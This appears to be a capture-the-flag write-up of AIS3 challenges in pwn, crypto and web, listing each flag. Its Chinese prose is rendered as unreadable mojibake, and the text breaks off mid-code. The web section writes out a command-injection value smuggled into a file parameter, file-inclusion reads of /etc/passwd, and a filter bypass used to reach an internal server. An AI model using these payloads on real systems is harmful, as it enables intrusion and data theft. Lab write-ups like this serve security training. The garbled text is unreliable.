<p>é€™é¡Œè®“æˆ‘å€‘è¼¸å…¥ shellcodeï¼Œç„¶å¾Œæœƒæª¢æŸ¥ shellcode è£¡é¢æœ‰æ²’æœ‰ <code>wubbalubbadubdub</code> é€™æ®µå­—ï¼Œä¸¦ä¸”åœ¨é€™æ®µå­—å‰é¢çš„æ¯å€‹å­—éƒ½è¦å°æ–¼ç­‰æ–¼ 31ï¼Œè€Œæ‰¾åˆ°é‚£æ®µå­—ä¹‹å¾Œå°±æœƒç›´æ¥è·³å‡ºæª¢æŸ¥å‡½å¼ï¼Œæ‰€ä»¥é‚£æ®µå­—çš„å¾Œé¢éƒ½ä¸æœƒè¢«æª¢æŸ¥äº†ï¼Œé‚£æˆ‘å€‘çš„ shellcode å°±æ§‹é€ æˆæœ€é–‹é ­å…ˆ <code>ja</code> è·³åˆ°å¾Œé¢çœŸæ­£çš„ shellcodeï¼Œç„¶å¾Œä¸­é–“æ”¾ <code>wubbalubbadubdub</code>ï¼Œå°±å®Œæˆäº†ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ja shellcode</span><br><span class="line">... (some padding instructions)</span><br><span class="line">wubbalubbadubdub</span><br><span class="line">shellcode:</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;Y0U_5peAk_$helL_codE_7hat_iS_CARzy!!!&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Portal-Gun">Portal Gun</h3>
<p>é€™é¡Œå°±æ˜¯ç”¨ <code>gets</code> çš„ bofï¼Œæœ‰ä¸€å€‹å‡½å¼æœ‰ç”¨åˆ° <code>system('sh')</code>ï¼Œä½†æ˜¯ä»–æœ‰ <code>LD_PRELOAD</code> ä¸€å€‹ <code>hook.so</code> è£¡é¢æŠŠ <code>system</code> hook æ‰äº†ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥å«ï¼Œé‚£å°±å † ROP leak libc address å†è‡ªå·±è·³é€²å» system å§ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;U5E_Port@L_6uN_7o_GET_tHe_$h3L1_0_o&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Morty-School">Morty School</h3>
<p>é€™é¡Œä¸€é–‹å§‹å°±çµ¦ä½  leak libc address çµ¦ä½ ï¼Œæ¥ä¸‹ä¾†ä½ å¯ä»¥æŒ‘ä¸€å€‹ Morty æ•™ï¼Œä½†ä½ çµ¦çš„ index ä»–æ²’æœ‰æª¢æŸ¥ï¼Œæ‰€ä»¥å¯ä»¥ä»»æ„å¯«ä¸€å€‹ä½å€ï¼Œä½†æ˜¯ä¸æ˜¯ç›´æ¥å¯«å€¼ä¸Šå»ï¼Œè€Œæ˜¯å¯«åˆ°ä½ çµ¦ä»–çš„ä½å€è£¡é¢æ”¾çš„ä½å€è£¡é¢çš„å€¼ï¼Œæ‰€ä»¥æ‰¾ä¸€ä¸‹å“ªè£¡æœ‰å­˜ <code>__stack_chk_fail</code> got çš„ä½å€ï¼Œåˆ©ç”¨ä»–å»å¯« <code>__stack_chk_fail</code> çš„ got æ”¹æˆæˆ‘å€‘ä¸²å¥½çš„ ROP gadgetsï¼Œç„¶å¾Œå¯«çˆ† stackï¼ˆ å› ç‚ºé€™è£¡ä¹Ÿæœ‰ overflow ï¼‰ï¼Œå°±è·³å»åš ROP äº†ï¼Œä¸€é–‹å§‹æœ‰æƒ³ç›´æ¥è·³ one gadgets ä½†æ˜¯æ¢ä»¶éƒ½ä¸ç¬¦ï¼Œæ‰€ä»¥å°±è‡ªå·±åš ROP åš <code>system('/bin/sh')</code>ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;s7ay_At_h0ME_And_Keep_$Oc1@L_D1$T4Nc3,M0rTyS&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Death-Crystal">Death Crystal</h3>
<p>é€™é¡Œæ˜¯ format stringï¼Œä½†æ˜¯æœ‰æª¢æŸ¥è¼¸å…¥ï¼Œæ‰€æœ‰å­—éƒ½ä¸èƒ½æœ‰ <code>$</code>, <code>\</code>, <code>/</code>, <code>^</code>ï¼Œä¸¦ä¸” <code>%</code> å¾Œé¢éƒ½ä¸èƒ½æœ‰ <code>c</code>, <code>p</code>, <code>n</code>, <code>h</code>ï¼Œä¸»è¦æ˜¯ä¸èƒ½ç”¨ <code>$</code> å»æŒ‡å®šåƒæ•¸ï¼Œä½†æ²’é—œä¿‚å°±å¤šæ”¾å¹¾å€‹ padding ç”¨çš„æŠŠåƒæ•¸æ¨éå»å°±å¥½äº†ï¼Œä»–çš„ <code>flag</code> å·²ç¶“è®€é€²ä¾†æ”¾åˆ° <code>0x202060</code> äº†ï¼Œä½†æ˜¯ PIE æœ‰é–‹æ‰€ä»¥é‚„æ˜¯è¦ leak ä¸€ä¸‹ code base addressï¼Œè¦ç¹éæª¢æŸ¥åªè¦å‰é¢éš¨ä¾¿æ”¾å€‹æ•¸å­—å°±å¥½äº†ï¼Œæ¯”å¦‚ <code>%1p</code>ï¼Œå…ˆ <code>b'%1p' * 11 + b';%1p'</code> leak å‡º code base addressï¼Œç„¶å¾Œå† <code>b'%d' * 8 + b'%100sAA\x00' + p64(base + 0x202060)</code> å°±æ‹¿åˆ° flag äº†ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;FOrM@T_5TRin6_15_$o0o_pOw3rFul_And_eAsY&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Meeseeks-Box">Meeseeks Box</h3>
<p>é€™é¡Œæ˜¯ heap é¡Œï¼Œå¾ˆä¸€èˆ¬çš„æœ‰ <code>create</code>, <code>show</code>, <code>delete</code> çš„é¡Œç›®ï¼Œç„¶å¾Œæ²’ä»€éº¼æª¢æŸ¥ï¼Œè€Œä¸”æ˜¯ ubuntu 18.04 æœ‰ tcache å¯ä»¥ç”¨ï¼Œæ‰€ä»¥å…ˆå¼„å€‹å¤ å¤§çš„ chunk ç„¶å¾Œ free æ‰ä»–è®“ä»–é€²åˆ° unsorted bins å°±å¯ä»¥æ‹¿ libc address äº†ï¼Œç„¶å¾Œæœ‰ tcache å¯ä»¥éš¨ä¾¿ double free ä»–å»æŠŠ <code>__malloc_hook</code> å¯«æˆ one gadget çš„ä½å€å°±å®Œæˆäº†ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;G0D_d4mn!_Mr._M3e5EEk5_g1V3S_Y0U_@_sH31l&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Crypto">Crypto</h2>
<h3 id="Brontosaurus">Brontosaurus</h3>
<p>çµ¦äº†ä¸€å€‹æª”æ¡ˆå« <code>KcufsJ</code> è£¡é¢æ˜¯ jsfuck æ··æ·†éçš„ js codeï¼Œä»–çš„æª”åå°±æ˜¯å€’éä¾†çš„ jsfuckï¼Œæ‰€ä»¥å…§å®¹ä¹Ÿè¦å€’éä¾†ï¼Œé–‹ç€è¦½å™¨ console åŸ·è¡Œä¸€ä¸‹å°±å¥½äº†ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;Br0n7Os4uru5_ch3at_3asi1Y&#125;</span><br></pre></td></tr></table></figure>
<h3 id="T-Rex">T-Rex</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">         !       @       #       $       %       &amp;</span><br><span class="line"></span><br><span class="line"> !       V       F       Y       J       6       1</span><br><span class="line"></span><br><span class="line"> @       5       0       M       2       9       L</span><br><span class="line"></span><br><span class="line"> #       I       W       H       S       4       Q</span><br><span class="line"></span><br><span class="line"> $       K       G       B       X       T       A</span><br><span class="line"></span><br><span class="line"> %       E       3       C       7       P       N</span><br><span class="line"></span><br><span class="line"> &amp;       U       Z       8       R       D       O</span><br><span class="line"></span><br><span class="line">&amp;$ !# $# @% &#123; %$ #! $&amp; %# &amp;% &amp;% @@ $# %# !&amp; $&amp; !&amp; !@ _ $&amp; @% $$ _ @$ !# !! @% _ #! @@ !&amp; _ $# &amp;&amp; #@ !% %$ ## ! # &amp;% @$ _ $&amp; &amp;$ &amp;% %&amp; &amp;&amp; #@ _ !@ %$ %&amp; %! $$ &amp;# !# !! &amp;% @% ## $% !% !&amp; @! #&amp; &amp;&amp; %&amp; !% %$ %# %$ @% ## %@ @@ $%  ## !&amp; #% %! %@ &amp;@ %! &amp;@ %$ $# ## %# !$ &amp;% @% !% !&amp; $&amp; &amp;% %# %@ #$ !# &amp;&amp; !&amp; #! %! ## #$ @! #% !! $! $&amp; @&amp; %% @ @ &amp;&amp; #&amp; @% @! @# #@ @@ @&amp; !@ %@ !# !# $# $! !@ &amp;$ $@ !! @! &amp;# @$ &amp;! &amp;# $! @@ &amp;@ !% #% #! &amp;@ &amp;$ @@ &amp;$ &amp;! !&amp; #! !# ## %$ !# !# %$ &amp;! !# @# ## @@ $! $$ %# %$ @% @&amp; $! &amp;! !$ $# #$ $&amp; #@ %@ @$ !% %&amp; %! @% #% $! !! #$ &amp;# ## &amp;#  &amp;&amp; $&amp; !! !% $! @&amp; !% &amp;@ !&amp; $! @# !@ !&amp; @$ $% #&amp; #$ %@ %% %% &amp;! $# !# $&amp; #@ &amp;! !# @! !@ @@ @@ ## !@ $@ !&amp; $# % &amp; %% !# !! $&amp; !$ $% !! @$ @&amp; !&amp; &amp;@ #$ &amp;&amp; @% $&amp; $&amp; !% &amp;! &amp;&amp; &amp;@ &amp;% @$ &amp;% &amp;$ &amp;@ $$ &#125;</span><br></pre></td></tr></table></figure>
<p>çµ¦äº†ä¸€å¼µè¡¨å’Œå¯†æ–‡ï¼Œå°è¡¨è½‰å›å»å°±å¥½äº†ï¼Œä½†è¦æ³¨æ„ row å’Œ column çš„é †åºï¼Œ<code>&amp;$</code> æ˜¯ A ä¸æ˜¯ Rã€‚</p>
<h3 id="Octopus">Octopus</h3>
<p>é€™é¡Œçµ¦ python script å’Œä»–åŸ·è¡Œå¾Œçš„ outputï¼Œè£¡é¢åœ¨åš <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Quantum_key_distribution#BB84_protocol:_Charles_H._Bennett_and_Gilles_Brassard_(1984)">BB84 é‡å­å¯†é‘°åˆ†ç™¼</a>ï¼Œå…©é‚Šçš„ Basis éƒ½çµ¦äº†ï¼ŒQubits ä¹Ÿçµ¦äº†ï¼Œå°±æ˜¯æŠŠ Basis ä¸€æ¨£éƒ¨åˆ†çš„é‚£äº› Qubits æŠ“å‡ºä¾†è½‰å› binary å°±å¥½äº†ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;EveryONe_kn0w_Quan7um_k3Y_Distr1but1on--BB84&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Blowfish">Blowfish</h3>
<p>é€™é¡Œè¦ <code>nc 60.250.197.227 12001</code>ï¼Œæœ‰çµ¦åŸå§‹ç¢¼ï¼Œé‚„æœ‰ä¸€å€‹ python pickle dump çš„æª”æ¡ˆ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&#x27;name&#x27;: &#x27;maojui&#x27;, &#x27;password&#x27;: &#x27;SECRET&#x27;, &#x27;admin&#x27;: False&#125;, &#123;&#x27;name&#x27;: &#x27;djosix&#x27;, &#x27;password&#x27;: &#x27;S3crE7&#x27;, &#x27;admin&#x27;: False&#125;, &#123;&#x27;name&#x27;: &#x27;kaibro&#x27;, &#x27;password&#x27;: &#x27;GGInIn&#x27;, &#x27;admin&#x27;: False&#125;, &#123;&#x27;name&#x27;: &#x27;others&#x27;, &#x27;password&#x27;: &#x27;_FLAG_&#x27;, &#x27;admin&#x27;: False&#125;]</span><br></pre></td></tr></table></figure>
<p>é€£ä¸Šå»ä¹‹å¾Œï¼Œä»–æœƒçµ¦ä½ é€™æ®µç”¨ Blowfish çš„ CTR Mode åŠ å¯†çš„çµæœç•¶ä½œ tokenï¼Œæ¥è‘—ä½ å°±å¯ä»¥å†æŠŠ token ä¸Ÿå›å»çµ¦ä»–è§£å¯†ï¼Œä»–æœƒçœ‹ä½ æ˜¯ä¸æ˜¯ adminï¼Œå› ç‚ºæ˜¯ CTR Mode æ‰€ä»¥å°±ç¿»ä¸€ä¸‹ bit å°±å¥½äº†ï¼ŒæŠŠé‚£å€‹ False çš„éƒ¨åˆ†ç¿»æˆ Trueï¼Œå°±é€™éº¼ç°¡å–®ã€‚<br>
è©³æƒ…å¯ä»¥åƒè€ƒ <a target="_blank" rel="noopener" href="https://github.com/oalieno/Crypto-Course/blob/master/Block-Cipher-Mode/Block-Cipher-Mode.pdf">é€™ä»½æŠ•å½±ç‰‡</a> Bit-Flipping Attack çš„éƒ¨åˆ†ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;ATk_BloWf1sH-CTR_by_b1t_Flipping_^_^&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Camel">Camel</h3>
<p>é€™é¡Œçµ¦äº† sage scriptï¼Œè£¡é¢æœ‰ä¸€å€‹ Elliptic Curveï¼Œä¸¦çµ¦äº†ä¸Šé¢çš„ 9 å€‹é»ï¼Œflag å°±æ˜¯ Elliptic Curve çš„åƒæ•¸ï¼Œå› ç‚ºä»–çµ¦çš„é»çš„ x åº§æ¨™éƒ½æ˜¯ $p-1, p+1, p+2, â€¦$ï¼Œæ‰€ä»¥å¸¶é€² $y^2 = x^3 + a x + b$ å¼å­ mod p ä¹‹å¾Œ p å°±éƒ½ä¸è¦‹äº†</p>
<p>$$<br>
\begin{align}<br>
&amp;(p-1)^3 + a (p-1) + b = -1 - a + b \pmod{p} \\<br>
&amp;(p+1)^3 + a (p+1) + b = 1 + a + b \pmod{p}<br>
\end{align}<br>
$$</p>
<p>ä¸Šé¢å…©å¼ç›¸åŠ ä¹‹å¾Œå¯ä»¥å¾—åˆ° <code>2b</code>ï¼Œé‚„æœ‰å…¶ä»–å…©çµ„ <code>p+3</code>, <code>p-3</code>, <code>p+5</code>, <code>p-5</code> ä¹Ÿæ˜¯åŒæ¨£çš„æƒ…æ³ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥æ‹¿åˆ°ä¸‰çµ„ <code>2b + kp</code> é€™æ¨£å½¢å¼çš„æ±è¥¿ï¼ŒæŠŠä»–å€‘äº’æ¸›å»åš gcd å°±å¾—åˆ° <code>p</code> äº†ï¼Œæœ‰ <code>p</code> ä¹‹å¾Œå°±å¸¶å›å»å°±å¯ä»¥å¾—åˆ° <code>a, b</code>ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;Curv3_Mak3_M3_Th1nK_Ab0Ut_CaME1_A_P&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Turtle">Turtle</h3>
<p>é€™é¡Œå°±æ˜¯ Padding Oracle Attackï¼Œæˆ‘æŠŠä»¥å‰çš„ script æ‹¿å‡ºä¾†ç„¶å¾ŒæŠŠ oracle æ›æˆç”¨ requests å»æŠ“å°±å®Œæˆäº†ã€‚<br>
è©³æƒ…å¯ä»¥åƒè€ƒ <a target="_blank" rel="noopener" href="https://github.com/oalieno/Crypto-Course/blob/master/Block-Cipher-Mode/Block-Cipher-Mode.pdf">é€™ä»½æŠ•å½±ç‰‡</a> Padding Oracle Attack çš„éƒ¨åˆ†ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;5l0w_4nd_5734dy_w1n5_7h3_r4c3.&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Web">Web</h2>
<h3 id="Squirrel">Squirrel</h3>
<p>é€™é¡Œç¶²ç«™åœ¨ <a target="_blank" rel="noopener" href="https://squirrel.ais3.org/%EF%BC%8C%E6%89%93%E9%96%8B%E7%9C%8B%E4%B8%80%E4%B8%8B%E6%B5%81%E9%87%8F%E6%9C%83%E7%9C%8B%E5%88%B0%E6%9C%89%E4%B8%80%E5%80%8B%E8%AB%8B%E6%B1%82%E6%98%AF">https://squirrel.ais3.org/ï¼Œæ‰“é–‹çœ‹ä¸€ä¸‹æµé‡æœƒçœ‹åˆ°æœ‰ä¸€å€‹è«‹æ±‚æ˜¯</a> <code>/api.php?get=/etc/passwd</code>ï¼Œçœ‹èµ·ä¾†æ˜¯ç›´æ¥çµ¦ä½  local file inclusionï¼ŒæŠ“ä¸€ä¸‹ç¶²ç«™åŸå§‹ç¢¼ <code>/api.php?get=/var/www/html/api.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application\/json&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$file</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;cat &#x27;<span class="subst">$file</span>&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$output</span> !== <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;output&#x27;</span> =&gt; <span class="variable">$output</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;cannot get file&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;empty file path&#x27;</span></span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>çœ‹èµ·ä¾†æ˜¯ command injectionï¼Œ<code>/api.php?get='|bash -c 'ls</code> å°±å¯ä»¥åŸ·è¡Œä»»æ„ command äº†ï¼Œ<code>ls /</code> çœ‹æ ¹ç›®éŒ„æœ‰å€‹ <code>5qu1rr3l_15_4_k1nd_0f_b16_r47.txt</code> è£¡é¢å°±æ˜¯ flag äº† ( å‰›å¥½æª”åè·Ÿ flag ä¸€æ¨£ï¼ŒçœŸä½›å¿ƒ )</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;5qu1rr3l_15_4_k1nd_0f_b16_r47&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Shark">Shark</h3>
<p>é€™é¡Œç¶²ç«™åœ¨ <a target="_blank" rel="noopener" href="https://shark.ais3.org/%EF%BC%8C%E9%A6%96%E9%A0%81%E6%9C%89%E5%80%8B%E9%80%A3%E7%B5%90%E9%BB%9E%E4%B8%8B%E5%8E%BB%E5%B0%B1%E6%98%AF">https://shark.ais3.org/ï¼Œé¦–é æœ‰å€‹é€£çµé»ä¸‹å»å°±æ˜¯</a> <code>/?path=hint.txt</code>ï¼Œåˆæ˜¯ local file inclusionï¼Œä½†æ˜¯ hint èªª</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Please find the other server in the internal network! (flag is on that server)</span><br><span class="line"></span><br><span class="line">    GET http://some-internal-server/flag</span><br></pre></td></tr></table></figure>
<p>é‚£å°±å…ˆçœ‹ä¸€ä¸‹åŸå§‹ç¢¼ <code>/?path=/var/www/html/index.php</code>ï¼Œç›´æ¥çœ‹æœƒæ‹¿åˆ° <code>[forbidden]</code>ï¼Œé‚£éš¨ä¾¿ç¹ä¸€ä¸‹ <code>/?path=file:///var/www/html/index.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$path</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(\.|\/)/&#x27;</span>, <span class="variable">$path</span>)) &#123;</span><br><span class="line">            <span class="comment">// disallow /path/like/this and ../this</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;[forbidden]&lt;/pre&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$content</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>, <span class="literal">FALSE</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">1000</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . (<span class="variable">$content</span> ? <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$content</span>) : <span class="string">&#x27;[empty]&#x27;</span>) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ğŸ¦ˆğŸ¦ˆğŸ¦ˆ&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;ğŸ¦ˆğŸ¦ˆğŸ¦ˆ&lt;/h1&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;?path=hint.txt&quot;</span>&gt;Shark <span class="keyword">never</span> cries?&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
<p>æœ‰ç”¨ regex æª¢æŸ¥é–‹é ­ä¸èƒ½æ˜¯ <code>.</code> å’Œ <code>/</code>ï¼Œæ‰€ä»¥ <code>file://</code> æˆ– <code>php://filter/read=convert.base64-encode/resource=</code> éƒ½å¯ä»¥ç¹ï¼Œå†ä¾†çœ‹ <code>/?path=file:///etc/hosts</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1	localhost</span><br><span class="line">::1	localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0	ip6-localnet</span><br><span class="line">ff00::0	ip6-mcastprefix</span><br><span class="line">ff02::1	ip6-allnodes</span><br><span class="line">ff02::2	ip6-allrouters</span><br><span class="line">172.22.0.3	02b23467485e</span><br></pre></td></tr></table></figure>
<p>ç€è¦½ä¸€ä¸‹ <code>/?path=http://02b23467485e</code> ç™¼ç¾æ˜¯æœ¬æ©Ÿï¼Œé‚£å°±æ‰¾æ‰¾å­ç¶²è·¯ä¸‹çš„é„°å±…å€‘ï¼Œå°±æ‰¾åˆ° <code>/?path=http://172.22.0.2/flag</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;5h4rk5_d0n&#x27;7_5w1m_b4ckw4rd5&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Elephant">Elephant</h3>
<p>é€™é¡Œç¶²ç«™åœ¨ <a target="_blank" rel="noopener" href="https://elephant.ais3.org/%EF%BC%8C%E9%A6%96%E9%A0%81%E5%8F%AF%E4%BB%A5%E7%99%BB%E5%85%A5%EF%BC%8C%E9%9A%A8%E4%BE%BF%E8%BC%B8%E5%85%A5%E5%80%8B">https://elephant.ais3.org/ï¼Œé¦–é å¯ä»¥ç™»å…¥ï¼Œéš¨ä¾¿è¼¸å…¥å€‹</a> username å°±ç™»å…¥äº†ä¸éœ€è¦å¯†ç¢¼ï¼Œç¬¬ä¸€æ­¥ç•¶ç„¶æ˜¯æ‰¾æ‰¾æœ‰æ²’æœ‰åŸå§‹ç¢¼ï¼Œçœ‹äº†ä¸€ä¸‹ <code>robots.txt</code> æ²’æ±è¥¿ï¼Œå†çœ‹ <code>.git</code> æ˜¯ Forbiddenï¼Œä¸­çï¼Œéš¨ä¾¿æ‰¾å€‹ GitDumper æŠŠ <code>.git</code> æŠ“ä¸‹ä¾†ï¼Œ<code>git log</code> çœ‹åˆ°å‰ä¸€å€‹ commit æŠŠåŸå§‹ç¢¼åˆªæ‰äº†ï¼Œ<code>git reset --hard</code> å›å»ï¼ŒåŸå§‹ç¢¼å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SESSION</span> = <span class="string">&#x27;elephant_user&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span 